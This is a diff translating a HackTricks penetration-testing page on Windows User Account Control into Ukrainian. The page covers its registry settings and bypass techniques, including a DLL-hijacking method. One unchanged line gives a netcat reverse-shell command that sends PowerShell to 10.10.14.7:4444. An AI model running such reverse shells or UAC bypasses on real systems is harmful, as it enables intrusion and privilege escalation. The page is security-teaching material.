@@ -1,24 +1,24 @@
-# UAC - User Account Control
+# UAC - Контроль облікових записів користувачів
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Підтримати HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси**, підтримувані **найсучаснішими** інструментами спільноти.\
+Отримайте доступ сьогодні:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -29,10 +29,10 @@ Get Access Today:
 Для отримання додаткової інформації про рівні інтегритету:
 
 {% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
-[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
+[рівні інтегритету.md](../windows-local-privilege-escalation/integrity-levels.md)
 {% endcontent-ref %}
 
-Коли UAC активовано, адміністратору надається 2 токена: стандартний ключ користувача для виконання звичайних дій на звичайному рівні та один з адміністративними привілеями.
+Коли UAC активовано, адміністратору надається 2 токени: стандартний ключ користувача для виконання звичайних дій на звичайному рівні та один з адміністративними привілеями.
 
 Ця [сторінка](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально обговорює, як працює UAC, включаючи процес входу, досвід користувача та архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC, специфічної для їхньої організації на локальному рівні (використовуючи secpol.msc) або налаштовувати та розгортати через об'єкти групової політики (GPO) в середовищі домену Active Directory. Різні налаштування обговорюються детально [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань групової політики, які можна встановити для UAC. Наступна таблиця надає додаткові деталі:
 
@@ -47,7 +47,7 @@ Get Access Today:
 | [Контроль облікових записів користувачів: Підвищувати лише програми UIAccess, які встановлені в захищених місцях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Увімкнено                                                      |
 | [Контроль облікових записів користувачів: Запускати всіх адміністраторів у режимі затвердження адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Увімкнено                                                      |
 | [Контроль облікових записів користувачів: Переключитися на захищений робочий стіл під час запиту на підвищення](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Увімкнено                                                      |
-| [Контроль облікових записів користувачів: Віртуалізувати помилки запису файлів і реєстру в місцях для кожного користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Увімкнено                                                      |
+| [Контроль облікових записів користувачів: Віртуалізувати збої запису файлів і реєстру в місцях для кожного користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Увімкнено                                                      |
 
 ### Теорія обходу UAC
 
@@ -86,12 +86,12 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 Якщо значення **`0`**, тоді лише користувач **RID 500** (**вбудований адміністратор**) може виконувати **адміністративні завдання без UAC**, а якщо `1`, **всі облікові записи в групі "Адміністратори"** можуть це робити.
 
 І, нарешті, зверніть увагу на значення ключа **`FilterAdministratorToken`**\
-Якщо **`0`**(за замовчуванням), **вбудований обліковий запис адміністратора може** виконувати віддалені адміністративні завдання, а якщо **`1`**, вбудований обліковий запис адміністратора **не може** виконувати віддалені адміністративні завдання, якщо `LocalAccountTokenFilterPolicy` не встановлено на `1`.
+Якщо **`0`**(за замовчуванням), **вбудований обліковий запис адміністратора може** виконувати завдання віддаленого адміністрування, а якщо **`1`**, вбудований обліковий запис адміністратора **не може** виконувати завдання віддаленого адміністрування, якщо `LocalAccountTokenFilterPolicy` не встановлено на `1`.
 
 #### Резюме
 
 * Якщо `EnableLUA=0` або **не існує**, **немає UAC для нікого**
-* Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1`, немає UAC для нікого**
+* Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1` , немає UAC для нікого**
 * Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=0`, немає UAC для RID 500 (вбудований адміністратор)**
 * Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=1`, UAC для всіх**
 
@@ -120,14 +120,14 @@ whoami /groups | findstr Level
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC обхід з дублікацією токенів
+#### Обхід UAC з дублікацією токенів
 
 * [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 * [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Дуже** базовий UAC "обхід" (повний доступ до файлової системи)
+### **Дуже** базовий "обхід" UAC (повний доступ до файлової системи)
 
-Якщо у вас є оболонка з користувачем, який є в групі Адміністраторів, ви можете **монтувати C$** спільний доступ через SMB (файлова система) локально на новий диск, і ви отримаєте **доступ до всього всередині файлової системи** (навіть до домашньої папки Адміністратора).
+Якщо у вас є оболонка з користувачем, який є в групі Адміністраторів, ви можете **монтувати C$** спільний доступ через SMB (файлова система) локально на новий диск, і ви отримаєте **доступ до всього в файловій системі** (навіть до домашньої папки Адміністратора).
 
 {% hint style="warning" %}
 **Схоже, цей трюк більше не працює**
@@ -172,7 +172,7 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.
+Також, використовуючи [цю](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) сторінку, ви отримуєте версію Windows `1607` з версій збірки.
 
 #### Більше обходів UAC
 
@@ -186,9 +186,9 @@ Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) 
 
 ### Обхід UAC з GUI
 
-Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли він з'явиться, вам насправді не потрібен обхід. Отже, доступ до GUI дозволить вам обійти UAC.
+Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли він з'явиться, вам насправді не потрібен обхід. Отже, отримання доступу до GUI дозволить вам обійти UAC.
 
-Більше того, якщо ви отримаєте сесію GUI, яку хтось використовував (потенційно через RDP), є **деякі інструменти, які працюватимуть як адміністратор**, з яких ви могли б **запустити** **cmd** наприклад **як адміністратор** без повторного запиту UAC, як [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **приховано**.
+Більше того, якщо ви отримали сесію GUI, яку хтось використовував (потенційно через RDP), є **деякі інструменти, які працюватимуть як адміністратор**, з яких ви могли б **запустити** **cmd**, наприклад, **як адміністратор** без повторного запиту UAC, як [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **прихованим**.
 
 ### Гучний брутфорс обхід UAC
 
@@ -196,18 +196,18 @@ Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) 
 
 ### Ваш власний обхід - Основна методологія обходу UAC
 
-Якщо ви подивитеся на **UACME**, ви помітите, що **більшість обходів UAC зловживають вразливістю Dll Hijacking** (в основному записуючи шкідливий dll у _C:\Windows\System32_). [Прочитайте це, щоб дізнатися, як знайти вразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).
+Якщо ви подивитеся на **UACME**, ви помітите, що **більшість обходів UAC зловживають вразливістю Dll Hijacking** (в основному записуючи шкідливу dll у _C:\Windows\System32_). [Прочитайте це, щоб дізнатися, як знайти вразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).
 
-1. Знайдіть двійковий файл, який буде **автоелевуватися** (перевірте, що при виконанні він працює на високому рівні цілісності).
+1. Знайдіть двійковий файл, який буде **авто підвищувати** (перевірте, що при виконанні він працює на високому рівні цілісності).
 2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
 3. Вам, ймовірно, потрібно буде **записати** DLL у деякі **захищені шляхи** (як C:\Windows\System32), де у вас немає прав на запис. Ви можете обійти це, використовуючи:
    1. **wusa.exe**: Windows 7, 8 і 8.1. Це дозволяє витягувати вміст CAB-файлу в захищені шляхи (оскільки цей інструмент виконується з високим рівнем цілісності).
    2. **IFileOperation**: Windows 10.
-4. Підготуйте **скрипт** для копіювання вашого DLL у захищений шлях і виконання вразливого та автоелевованого двійкового файлу.
+4. Підготуйте **скрипт** для копіювання вашої DLL у захищений шлях і виконання вразливого та авто підвищеного двійкового файлу.
 
 ### Інша техніка обходу UAC
 
-Складається з спостереження, чи **автоелевований двійковий файл** намагається **зчитати** з **реєстру** **ім'я/шлях** **двійкового файлу** або **команди**, що підлягає **виконанню** (це більш цікаво, якщо двійковий файл шукає цю інформацію в **HKCU**).
+Складається з спостереження, чи **авто підвищений двійковий файл** намагається **читати** з **реєстру** **ім'я/шлях** **двійкового файлу** або **команди** для **виконання** (це більш цікаво, якщо двійковий файл шукає цю інформацію в **HKCU**).
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -217,8 +217,8 @@ Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {% hint style="success" %}
-Вчіться та практикуйте хакінг AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вчіться та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
